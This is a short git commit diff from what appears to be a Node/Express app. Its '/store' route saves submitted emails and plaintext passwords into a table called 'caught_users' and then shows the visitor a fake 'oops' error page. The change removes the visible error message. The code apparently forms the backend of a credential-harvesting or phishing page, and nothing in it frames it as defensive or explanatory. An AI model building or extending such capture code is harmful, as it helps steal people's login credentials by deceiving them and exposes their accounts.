30164f0c1a8787068b4d889b0d8e9160000bcfde
Angela Evans <aevans@lelandmanagement.com>
2015-09-23 16:16:10 -0400

    getting closer for sure

--- index.js
+++ index.js
@@ -45,7 +45,7 @@ app.post('/store', function(req, res){
 		client.query('INSERT INTO caught_users(id, email, password) values($1, $2, $3)', [0, email, password], function(err, result) {
 		  done();
 		  if (err)
-		   { console.error(err); res.send("Error " + err); res.render('pages/oops'); }
+		   { console.error(err); res.render('pages/oops'); }
 		  else
 		   { res.render('pages/oops'); }
 		});
